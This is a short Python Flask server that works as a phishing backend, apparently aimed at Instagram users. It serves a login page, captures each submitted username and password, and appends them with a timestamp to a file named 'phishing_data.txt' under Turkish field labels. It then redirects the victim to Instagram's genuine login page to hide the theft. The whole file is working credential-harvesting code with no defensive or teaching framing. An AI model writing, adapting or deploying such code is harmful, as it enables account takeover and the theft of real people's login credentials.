from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def home():
    return open('index.html').read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open('phishing_data.txt', 'a') as f:
        f.write(f"{now} | Kullanıcı Adı: {username} | Şifre: {password}\n")

    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port)
